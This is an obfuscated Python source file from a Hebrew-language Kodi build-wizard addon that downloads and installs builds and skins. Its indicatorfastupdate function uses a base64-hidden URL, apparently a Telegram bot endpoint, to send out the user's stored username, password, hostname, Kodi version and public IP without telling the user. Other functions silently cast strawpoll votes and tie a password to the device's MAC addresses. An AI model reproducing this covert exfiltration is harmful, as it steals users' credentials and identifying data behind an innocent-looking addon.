# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob #line:21
import shutil #line:22
import urllib2 ,urllib #line:23
import re #line:24
import uservar #line:25
import time #line:26
import json #line:27
import speedtest #line:28
from shutil import copyfile #line:29
from datetime import date ,datetime ,timedelta #line:30
from resources .libs import extract ,downloader ,downloaderbg ,downloaderwiz ,notify ,loginit ,debridit ,traktit ,maintenance ,skinSwitch ,uploadLog ,wizard as wiz #line:31
global teleupdate #line:32
teleupdate =False #line:33
ADDON_ID =uservar .ADDON_ID #line:34
ADDONTITLE =uservar .ADDONTITLE #line:35
ADDON =wiz .addonId (ADDON_ID )#line:36
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:37
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:38
ADDONID =wiz .addonInfo (ADDON_ID ,'id')#line:39
DIALOG =xbmcgui .Dialog ()#line:40
DP =xbmcgui .DialogProgress ()#line:41
DP2 =xbmcgui .DialogProgressBG ()#line:42
HOME =xbmc .translatePath ('special://home/')#line:43
PROFILE =xbmc .translatePath ('special://profile/')#line:44
KODIHOME =xbmc .translatePath ('special://xbmc/')#line:45
ADDONS =os .path .join (HOME ,'addons')#line:46
KODIADDONS =os .path .join (KODIHOME ,'addons')#line:47
USERDATA =os .path .join (HOME ,'userdata')#line:48
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:49
PACKAGES =os .path .join (ADDONS ,'packages')#line:50
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:51
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:52
ICON =os .path .join (ADDONPATH ,'icon.png')#line:53
ART =os .path .join (ADDONPATH ,'resources','art')#line:54
SKIN =xbmc .getSkinDir ()#line:55
BUILDNAME =wiz .getS ('buildname')#line:56
DEFAULTSKIN =wiz .getS ('defaultskin')#line:57
DEFAULTNAME =wiz .getS ('defaultskinname')#line:58
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:59
BUILDVERSION =wiz .getS ('buildversion')#line:60
BUILDLATEST =wiz .getS ('latestversion')#line:61
BUILDCHECK =wiz .getS ('lastbuildcheck')#line:62
DISABLEUPDATE =wiz .getS ('disableupdate')#line:63
AUTOCLEANUP =wiz .getS ('autoclean')#line:64
AUTOCACHE =wiz .getS ('clearcache')#line:65
AUTOPACKAGES =wiz .getS ('clearpackages')#line:66
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:67
AUTOFEQ =wiz .getS ('autocleanfeq')#line:68
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:69
TRAKTSAVE =wiz .getS ('traktlastsave')#line:70
REALSAVE =wiz .getS ('debridlastsave')#line:71
LOGINSAVE =wiz .getS ('loginlastsave')#line:72
INSTALLMETHOD =wiz .getS ('installmethod')#line:73
KEEPTRAKT =wiz .getS ('keeptrakt')#line:74
KEEPREAL =wiz .getS ('keepdebrid')#line:75
KEEPLOGIN =wiz .getS ('keeplogin')#line:76
INSTALLED =wiz .getS ('installed')#line:77
EXTRACT =wiz .getS ('extract')#line:78
EXTERROR =wiz .getS ('errors')#line:79
NOTIFY =wiz .getS ('notify')#line:80
NOTEDISMISS =wiz .getS ('notedismiss')#line:81
NOTEID =wiz .getS ('noteid')#line:82
NOTIFY2 =wiz .getS ('notify2')#line:83
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:84
NOTEID2 =wiz .getS ('noteid2')#line:85
NOTIFY3 =wiz .getS ('notify3')#line:86
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:87
NOTEID3 =wiz .getS ('noteid3')#line:88
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else HOME #line:89
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:90
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:91
NOTEID2 =0 if NOTEID2 ==""else int (NOTEID2 )#line:92
NOTEID3 =0 if NOTEID3 ==""else int (NOTEID3 )#line:93
AUTOFEQ =int (AUTOFEQ )if AUTOFEQ .isdigit ()else 1 #line:94
TODAY =date .today ()#line:95
TOMORROW =TODAY +timedelta (days =1 )#line:96
TWODAYS =TODAY +timedelta (days =2 )#line:97
THREEDAYS =TODAY +timedelta (days =3 )#line:98
ONEWEEK =TODAY +timedelta (days =7 )#line:99
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:100
EXCLUDES =uservar .EXCLUDES #line:101
SPEEDFILE =speedtest .SPEEDFILE #line:102
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:103
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:104
NOTIFICATION =uservar .NOTIFICATION #line:105
NOTIFICATION2 =uservar .NOTIFICATION2 #line:106
NOTIFICATION3 =uservar .NOTIFICATION3 #line:107
ENABLE =uservar .ENABLE #line:108
UNAME =speedtest .UNAME #line:109
HEADERMESSAGE =uservar .HEADERMESSAGE #line:110
AUTOUPDATE =uservar .AUTOUPDATE #line:111
WIZARDFILE =uservar .WIZARDFILE #line:112
AUTOINSTALL =uservar .AUTOINSTALL #line:113
REPOID =uservar .REPOID #line:114
REPOADDONXML =uservar .REPOADDONXML #line:115
REPOZIPURL =uservar .REPOZIPURL #line:116
REPOID18 =uservar .REPOID18 #line:117
REPOADDONXML18 =uservar .REPOADDONXML18 #line:118
REPOZIPURL18 =uservar .REPOZIPURL18 #line:119
REQUESTSID =uservar .REQUESTSID #line:121
REQUESTSXML =uservar .REQUESTSXML #line:122
REQUESTSURL =uservar .REQUESTSURL #line:123
COLOR1 =uservar .COLOR1 #line:127
COLOR2 =uservar .COLOR2 #line:128
TMDB_NEW_API =uservar .TMDB_NEW_API #line:129
WORKING =True if wiz .workingURL (SPEEDFILE )==True else False #line:130
FAILED =False #line:131
xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:132
AddonID ='plugin.program.Anonymous'#line:134
packagesdir =xbmc .translatePath (os .path .join ('special://home/addons/packages',''))#line:135
thumbnails =xbmc .translatePath ('special://home/userdata/Thumbnails')#line:136
dialog =xbmcgui .Dialog ()#line:137
setting =xbmcaddon .Addon ().getSetting #line:138
iconpath =xbmc .translatePath (os .path .join ('special://home/addons/'+AddonID ,'icon.png'))#line:139
notify_mode =setting ('notify_mode')#line:140
auto_clean =setting ('startup.cache')#line:141
filesize_thumb =int (setting ('filesizethumb_alert'))#line:143
total_size2 =0 #line:146
total_size =0 #line:147
count =0 #line:148
def infobuild ():#line:159
	O0000OO0O0000OOOO =wiz .workingURL (NOTIFICATION )#line:160
	if O0000OO0O0000OOOO ==True :#line:161
		try :#line:162
			O00OO000OOOOOO0OO ,O00O000OOO0O00O00 =wiz .splitNotify (NOTIFICATION )#line:163
			if O00OO000OOOOOO0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:164
			if STARTP2 ()=='ok':#line:165
				notify .updateinfo (O00O000OOO0O00O00 ,True )#line:166
		except Exception as OOO0OO00OOO0OO0O0 :#line:167
			wiz .log ("Error on Notifications Window: %s"%str (OOO0OO00OOO0OO0O0 ),xbmc .LOGERROR )#line:168
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:169
def disply_hwr ():#line:170
   try :#line:171
    OO0000OO00O0OOO0O =tmdb_list (TMDB_NEW_API )#line:172
    O00OO000O0O0000OO =str ((getHwAddr ('eth0'))*OO0000OO00O0OOO0O )#line:173
    O00OO00O00OOOO00O =(O00OO000O0O0000OO [1 ]+O00OO000O0O0000OO [2 ]+O00OO000O0O0000OO [5 ]+O00OO000O0O0000OO [7 ])#line:180
    O0O0O0000O0OO00OO =(ADDON .getSetting ("action"))#line:181
    wiz .setS ('action',str (O00OO00O00OOOO00O ))#line:183
   except :pass #line:184
def getHwAddr (O0OO00O0OOO0000OO ):#line:185
   import subprocess ,time #line:186
   O000OO0O00OOO0O0O ='windows'#line:187
   if xbmc .getCondVisibility ('system.platform.android'):#line:188
       O000OO0O00OOO0O0O ='android'#line:189
   if xbmc .getCondVisibility ('system.platform.android'):#line:190
     OOOOO00OOOO00O00O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:191
     OOO0OOO00O00O00OO =re .compile ('link/ether (.+?) brd').findall (str (OOOOO00OOOO00O00O ))#line:193
     O000000O0000OO00O =0 #line:194
     for O0O0000O0O0OO0O0O in OOO0OOO00O00O00OO :#line:195
      if OOO0OOO00O00O00OO !='00:00:00:00:00:00':#line:196
          O000OO00O0OOO00O0 =O0O0000O0O0OO0O0O #line:197
          O000000O0000OO00O =O000000O0000OO00O +int (O000OO00O0OOO00O0 .replace (':',''),16 )#line:198
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:200
       O0O000OOO0O0OO0O0 =0 #line:201
       O000000O0000OO00O =0 #line:202
       O000O000O0O00O0OO =[]#line:203
       O000000OO0OO0O00O =os .popen ("getmac").read ()#line:204
       O000000OO0OO0O00O =O000000OO0OO0O00O .split ("\n")#line:205
       for OO000O000000OO0OO in O000000OO0OO0O00O :#line:207
            OO0O00OOO000O0OO0 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO000O000000OO0OO ,re .I )#line:208
            if OO0O00OOO000O0OO0 :#line:209
                OOO0OOO00O00O00OO =OO0O00OOO000O0OO0 .group ().replace ('-',':')#line:210
                O000O000O0O00O0OO .append (OOO0OOO00O00O00OO )#line:211
                O000000O0000OO00O =O000000O0000OO00O +int (OOO0OOO00O00O00OO .replace (':',''),16 )#line:214
   else :#line:216
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:217
   try :#line:234
    return O000000O0000OO00O #line:235
   except :pass #line:236
def decode (O0OOO0OO0000OO000 ,O0OOO0OOO0O0O0O00 ):#line:237
    import base64 #line:238
    OOO0O0OO00OOOO00O =[]#line:239
    if (len (O0OOO0OO0000OO000 ))!=4 :#line:241
     return 10 #line:242
    O0OOO0OOO0O0O0O00 =base64 .urlsafe_b64decode (O0OOO0OOO0O0O0O00 )#line:243
    for OO000OOO00OOO00O0 in range (len (O0OOO0OOO0O0O0O00 )):#line:245
        OO0O0OO0O0O0OO00O =O0OOO0OO0000OO000 [OO000OOO00OOO00O0 %len (O0OOO0OO0000OO000 )]#line:246
        OO0OO0OO0OOO00O0O =chr ((256 +ord (O0OOO0OOO0O0O0O00 [OO000OOO00OOO00O0 ])-ord (OO0O0OO0O0O0OO00O ))%256 )#line:247
        OOO0O0OO00OOOO00O .append (OO0OO0OO0OOO00O0O )#line:248
    return "".join (OOO0O0OO00OOOO00O )#line:249
def tmdb_list (OOO00OO000O000OO0 ):#line:250
    OO0000O000O000O0O =decode ("7643",OOO00OO000O000OO0 )#line:253
    return int (OO0000O000O000O0O )#line:256
def u_list (OOOO0000000O0OO00 ):#line:257
    from math import sqrt #line:259
    O0OOO0000O00O0000 =tmdb_list (TMDB_NEW_API )#line:260
    OOOO0O00OOO000O0O =str ((getHwAddr ('eth0'))*O0OOO0000O00O0000 )#line:262
    O00OOOOOOO00000OO =int (OOOO0O00OOO000O0O [1 ]+OOOO0O00OOO000O0O [2 ]+OOOO0O00OOO000O0O [5 ]+OOOO0O00OOO000O0O [7 ])#line:263
    OO0OOO00O00OOO00O =(ADDON .getSetting ("pass"))#line:265
    O0OOO0O00OOO0OO0O =(str (round (sqrt ((O00OOOOOOO00000OO *500 )+30 )+30 ,4 ))[-4 :]).replace ('.','')#line:270
    if '.'in O0OOO0O00OOO0OO0O :#line:271
     O0OOO0O00OOO0OO0O =(str (round (sqrt ((O00OOOOOOO00000OO *500 )+30 )+30 ,4 ))[-5 :]).replace ('.','')#line:272
    if OO0OOO00O00OOO00O ==O0OOO0O00OOO0OO0O :#line:273
      O0OOO0O0O00O0O0OO =OOOO0000000O0OO00 #line:275
    else :#line:277
       if STARTP ()and STARTP2 ()=='ok':#line:278
         return OOOO0000000O0OO00 #line:280
       O0OOO0O0O00O0O0OO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:281
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:282
       sys .exit ()#line:283
    return O0OOO0O0O00O0O0OO #line:284
try :#line:285
   disply_hwr ()#line:286
except :#line:287
   pass #line:288
def dis_or_enable_addon (OO00OOOOOO0O00000 ,OOOOOO0OO00O0OO0O ,enable ="true"):#line:289
    import json #line:290
    OOO0O0000OOO000OO ='"%s"'%OO00OOOOOO0O00000 #line:291
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00OOOOOO0O00000 )and enable =="true":#line:292
        logging .warning ('already Enabled')#line:293
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO00OOOOOO0O00000 )#line:294
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00OOOOOO0O00000 )and enable =="false":#line:295
        return xbmc .log ("### Skipped %s, reason = not installed"%OO00OOOOOO0O00000 )#line:296
    else :#line:297
        O00OOOOO00O0OOOO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOO0O0000OOO000OO ,enable )#line:298
        OO0O0OOO0OOOO0OOO =xbmc .executeJSONRPC (O00OOOOO00O0OOOO0 )#line:299
        O00OOO0OOOOOO0O0O =json .loads (OO0O0OOO0OOOO0OOO )#line:300
        if enable =="true":#line:301
            xbmc .log ("### Enabled %s, response = %s"%(OO00OOOOOO0O00000 ,O00OOO0OOOOOO0O0O ))#line:302
        else :#line:303
            xbmc .log ("### Disabled %s, response = %s"%(OO00OOOOOO0O00000 ,O00OOO0OOOOOO0O0O ))#line:304
    if OOOOOO0OO00O0OO0O =='auto':#line:305
     return True #line:306
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:307
def update_Votes ():#line:308
   try :#line:309
        import requests #line:310
        O00OO000O0OO0000O ='18773068'#line:311
        O0O00000O0O00000O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00OO000O0OO0000O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:323
        O0OO0OOO0OOOOOOO0 ='145273321'#line:325
        O000OOOO00OOOO0O0 ={'options':O0OO0OOO0OOOOOOO0 }#line:331
        OO0O0OO0O0000O0OO =requests .post ('https://www.strawpoll.me/'+O00OO000O0OO0000O ,headers =O0O00000O0O00000O ,data =O000OOOO00OOOO0O0 )#line:333
   except :pass #line:334
def display_Votes ():#line:335
    try :#line:336
        OO000O0O0000O000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:337
        O000OO0O000OOO000 =open (OO000O0O0000O000O ,'r')#line:339
        OOOOO00OO0OOOOO0O =O000OO0O000OOO000 .read ()#line:340
        O000OO0O000OOO000 .close ()#line:341
        O000O0OOO0O000000 ='<setting id="HomeS" type="string">(.+?)</setting>'#line:342
        O00OO0OOO00O00OOO =re .compile (O000O0OOO0O000000 ).findall (OOOOO00OO0OOOOO0O )[0 ]#line:344
        import requests #line:350
        O00O0OO00O0OOO0O0 ='18782966'#line:351
        O00O0000000OO0OOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00O0OO00O0OOO0O0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:363
        OOO0000O000OO0O0O ='145313053'#line:365
        OO0OO0O0OO0000000 ='145313054'#line:366
        O0OO0OOOO00O0OO0O ='145313057'#line:367
        O00O00O0O0O0O0O0O ='145313058'#line:368
        O0000OOOOOOO00OOO ='145313055'#line:369
        OO0O000000O00000O ='145313060'#line:370
        O0O000OO0OO00OOOO ='145313056'#line:371
        O00O0OOO0000OOO0O ='145313059'#line:372
        if O00OO0OOO00O00OOO =='emin':#line:375
           OOOOO00OO0OO000OO =OOO0000O000OO0O0O #line:376
        if O00OO0OOO00O00OOO =='nox':#line:377
           OOOOO00OO0OO000OO =OO0OO0O0OO0000000 #line:378
        if O00OO0OOO00O00OOO =='noxtitan':#line:379
           OOOOO00OO0OO000OO =OO0OO0O0OO0000000 #line:380
        if O00OO0OOO00O00OOO =='titan':#line:381
           OOOOO00OO0OO000OO =O0OO0OOOO00O0OO0O #line:382
        if O00OO0OOO00O00OOO =='pheno':#line:383
           OOOOO00OO0OO000OO =O00O00O0O0O0O0O0O #line:384
        if O00OO0OOO00O00OOO =='netflix':#line:385
           OOOOO00OO0OO000OO =O0000OOOOOOO00OOO #line:386
        if O00OO0OOO00O00OOO =='nebula':#line:387
           OOOOO00OO0OO000OO =OO0O000000O00000O #line:388
        if O00OO0OOO00O00OOO =='pellucid':#line:389
           OOOOO00OO0OO000OO =O0O000OO0OO00OOOO #line:390
        if O00OO0OOO00O00OOO =='pellucid2':#line:391
           OOOOO00OO0OO000OO =O00O0OOO0000OOO0O #line:392
        OO000000OO0O0O00O ={'options':OOOOO00OO0OO000OO }#line:398
        O00OO0O0OO0OO0OO0 =requests .post ('https://www.strawpoll.me/'+O00O0OO00O0OOO0O0 ,headers =O00O0000000OO0OOO ,data =OO000000OO0O0O00O )#line:400
    except :pass #line:401
def resetkodi ():#line:402
		if xbmc .getCondVisibility ('system.platform.windows'):#line:403
			O000OO000O0000OO0 =xbmcgui .DialogProgress ()#line:404
			O000OO000O0000OO0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:407
			O000OO000O0000OO0 .update (0 )#line:408
			for OO0000000OOOO0O0O in range (5 ,-1 ,-1 ):#line:409
				time .sleep (1 )#line:410
				O000OO000O0000OO0 .update (int ((5 -OO0000000OOOO0O0O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO0000000OOOO0O0O ),'')#line:411
				if O000OO000O0000OO0 .iscanceled ():#line:412
					from resources .libs import win #line:413
					return None ,None #line:414
			from resources .libs import win #line:415
		else :#line:416
			O000OO000O0000OO0 =xbmcgui .DialogProgress ()#line:417
			O000OO000O0000OO0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:420
			O000OO000O0000OO0 .update (0 )#line:421
			for OO0000000OOOO0O0O in range (5 ,-1 ,-1 ):#line:422
				time .sleep (1 )#line:423
				O000OO000O0000OO0 .update (int ((5 -OO0000000OOOO0O0O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO0000000OOOO0O0O ),'')#line:424
				if O000OO000O0000OO0 .iscanceled ():#line:425
					os ._exit (1 )#line:426
					return None ,None #line:427
			os ._exit (1 )#line:428
def indicatorfastupdate ():#line:429
       try :#line:430
          import json #line:431
          wiz .log ('FRESH MESSAGE')#line:432
          OOOO0000O00OOOOOO =(ADDON .getSetting ("user"))#line:433
          O0O000O0OO0OO0OOO =(ADDON .getSetting ("pass"))#line:434
          OOOOO0OOO00O0000O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:435
          O0O0OOOOOO000O00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:437
          OO0O0O0OO00O000O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:438
          O00O0O0O0O000000O =str (json .loads (OO0O0O0OO00O000O0 )['ip'])#line:439
          OOOOO000O00OO0O0O =OOOO0000O00OOOOOO #line:440
          OO0O0O0OOOO0OO000 =O0O000O0OO0OO0OOO #line:441
          import socket #line:442
          OO0O0O0OO00O000O0 =urllib2 .urlopen (O0O0OOOOOO000O00O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOOO000O00OO0O0O +' - '+OO0O0O0OOOO0OO000 +' - '+OOOOO0OOO00O0000O +' - '+O00O0O0O0O000000O ).readlines ()#line:443
       except :pass #line:445
def skindialogsettind18 ():#line:446
	try :#line:447
		O00O0O0O00OO000O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:448
		O000OO00O0OOO0OOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:449
		copyfile (O00O0O0O00OO000O0 ,O000OO00O0OOO0OOO )#line:450
	except :pass #line:451
def telemedia_android5fix ():#line:452
    O0O00O0O0O0O0O00O =ADDON .getSetting ('systemtype')#line:453
    O0O000OO00OOO0OO0 =ADDON .getSetting ('teleandro')#line:454
    if xbmc .getCondVisibility ('system.platform.android')and 'Android 5'in O0O00O0O0O0O0O00O or O0O000OO00OOO0OO0 =='true':#line:455
        OOO0OOOO0OOO0OOO0 ='https://github.com/kodianonymous1/build/blob/master/tele.zip?raw=true'#line:457
        OOO0O00O00O0OOO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:458
        OO0O0OO0OOOO000OO =xbmcgui .DialogProgress ()#line:459
        OO0O0OO0OOOO000OO .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]" '','אנא המתן')#line:460
        OO00O0OOO0000O0O0 =os .path .join (PACKAGES ,'isr.zip')#line:461
        O0O00O00O0O0O00O0 =urllib2 .Request (OOO0OOOO0OOO0OOO0 )#line:462
        O0O00OOO0OO0O000O =urllib2 .urlopen (O0O00O00O0O0O00O0 )#line:463
        O0000000OOOOOOO0O =xbmcgui .DialogProgress ()#line:465
        O0000000OOOOOOO0O .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]")#line:466
        O0000000OOOOOOO0O .update (0 )#line:467
        OOO000O0OO0O0OOOO =open (OO00O0OOO0000O0O0 ,'wb')#line:469
        try :#line:471
          OOOOO000O00O00O00 =O0O00OOO0OO0O000O .info ().getheader ('Content-Length').strip ()#line:472
          OOOOO00O00000OOO0 =True #line:473
        except AttributeError :#line:474
              OOOOO00O00000OOO0 =False #line:475
        if OOOOO00O00000OOO0 :#line:477
              OOOOO000O00O00O00 =int (OOOOO000O00O00O00 )#line:478
        O00000OOOO0000OOO =0 #line:480
        O0000OO0OOOO0O0OO =time .time ()#line:481
        while True :#line:482
              OOOO0O0OOOO0O0OOO =O0O00OOO0OO0O000O .read (8192 )#line:483
              if not OOOO0O0OOOO0O0OOO :#line:484
                  sys .stdout .write ('\n')#line:485
                  break #line:486
              O00000OOOO0000OOO +=len (OOOO0O0OOOO0O0OOO )#line:488
              OOO000O0OO0O0OOOO .write (OOOO0O0OOOO0O0OOO )#line:489
              if not OOOOO00O00000OOO0 :#line:491
                  OOOOO000O00O00O00 =O00000OOOO0000OOO #line:492
              if O0000000OOOOOOO0O .iscanceled ():#line:493
                 O0000000OOOOOOO0O .close ()#line:494
                 try :#line:495
                  os .remove (OO00O0OOO0000O0O0 )#line:496
                 except :#line:497
                  pass #line:498
                 break #line:499
              OO00OO0OO0O0O000O =float (O00000OOOO0000OOO )/OOOOO000O00O00O00 #line:500
              OO00OO0OO0O0O000O =round (OO00OO0OO0O0O000O *100 ,2 )#line:501
              O00OOO0OOOOOO00O0 =O00000OOOO0000OOO /(1024 *1024 )#line:502
              O00OOO00OOO000000 =OOOOO000O00O00O00 /(1024 *1024 )#line:503
              O000OO0O0OOOOO0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OOO0OOOOOO00O0 ,'teal',O00OOO00OOO000000 )#line:504
              if (time .time ()-O0000OO0OOOO0O0OO )>0 :#line:505
                OO00O0OO00OOO0O0O =O00000OOOO0000OOO /(time .time ()-O0000OO0OOOO0O0OO )#line:506
                OO00O0OO00OOO0O0O =OO00O0OO00OOO0O0O /1024 #line:507
              else :#line:508
               OO00O0OO00OOO0O0O =0 #line:509
              O0O000OO00000O00O ='KB'#line:510
              if OO00O0OO00OOO0O0O >=1024 :#line:511
                 OO00O0OO00OOO0O0O =OO00O0OO00OOO0O0O /1024 #line:512
                 O0O000OO00000O00O ='MB'#line:513
              if OO00O0OO00OOO0O0O >0 and not OO00OO0OO0O0O000O ==100 :#line:514
                  O0O0OO00O0O000000 =(OOOOO000O00O00O00 -O00000OOOO0000OOO )/OO00O0OO00OOO0O0O #line:515
              else :#line:516
                  O0O0OO00O0O000000 =0 #line:517
              O00OO00000000OOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00O0OO00OOO0O0O ,O0O000OO00000O00O )#line:518
              O0000000OOOOOOO0O .update (int (OO00OO0OO0O0O000O ),O000OO0O0OOOOO0OO ,O00OO00000000OOO0 +"[B][COLOR=green]מוריד.... [/COLOR][/B]")#line:520
        O0000000O000O0OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:523
        OOO000O0OO0O0OOOO .close ()#line:526
        extract .all (OO00O0OOO0000O0O0 ,O0000000O000O0OOO ,O0000000OOOOOOO0O )#line:527
        try :#line:531
          os .remove (OO00O0OOO0000O0O0 )#line:532
        except :#line:533
          pass #line:534
def checkidupdate ():#line:535
				OOOOO000O0O00OOO0 =True #line:536
				wiz .setS ("notedismiss","true")#line:537
				OO000000O00OO0OO0 =wiz .workingURL (NOTIFICATION )#line:538
				OO00OO0000000OO00 =" Kodi Premium"#line:540
				OO0O0000O00O0O000 =wiz .checkBuild (OO00OO0000000OO00 ,'gui')#line:541
				O00O0O0O0OO0O0OOO =OO00OO0000000OO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:542
				if not wiz .workingURL (OO0O0000O00O0O000 )==True :return #line:543
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:544
				O000OOOOOOO0O0O0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0O0O0OO0O0OOO )#line:547
				try :os .remove (O000OOOOOOO0O0O0O )#line:548
				except :pass #line:549
				if 'google'in OO0O0000O00O0O000 :#line:551
				   O00OO0O0OO0O00OO0 =googledrive_download (OO0O0000O00O0O000 ,O000OOOOOOO0O0O0O ,DP2 ,wiz .checkBuild (OO00OO0000000OO00 ,'filesize'))#line:552
				else :#line:555
				  downloaderbg .download3 (OO0O0000O00O0O000 ,O000OOOOOOO0O0O0O ,DP2 )#line:556
				xbmc .sleep (100 )#line:557
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:558
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:560
				extract .all2 (O000OOOOOOO0O0O0O ,HOME ,DP2 )#line:562
				DP2 .close ()#line:563
				wiz .defaultSkin ()#line:564
				wiz .lookandFeelData ('save')#line:565
				try :#line:566
					telemedia_android5fix ()#line:567
				except :pass #line:568
				wiz .kodi17Fix ()#line:569
				if KODIV >=18 :#line:570
					skindialogsettind18 ()#line:571
				debridit .debridIt ('restore','all')#line:576
				traktit .traktIt ('restore','all')#line:577
				if INSTALLMETHOD ==1 :OOOO00OO00OOOOO0O =1 #line:578
				elif INSTALLMETHOD ==2 :OOOO00OO00OOOOO0O =0 #line:579
				else :DP2 .close ()#line:580
				O0O00O0OOOO00OOO0 =(NOTIFICATION2 )#line:581
				OO0O0OO00OO0OO00O =urllib2 .urlopen (O0O00O0OOOO00OOO0 )#line:582
				O0OOOOO0OO0OOO000 =OO0O0OO00OO0OO00O .readlines ()#line:583
				O000O0OO0OOOOO000 =0 #line:584
				for OO00OO000O00OO000 in O0OOOOO0OO0OOO000 :#line:587
					if OO00OO000O00OO000 .split (' ==')[0 ]=="noreset"or OO00OO000O00OO000 .split ()[0 ]=="noreset":#line:588
						xbmc .executebuiltin ("ReloadSkin()")#line:590
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:591
						O00OO0000OOOOOOO0 =(ADDON .getSetting ("message"))#line:592
						if O00OO0000OOOOOOO0 =='true':#line:593
							infobuild ()#line:594
						update_Votes ()#line:595
						indicatorfastupdate ()#line:596
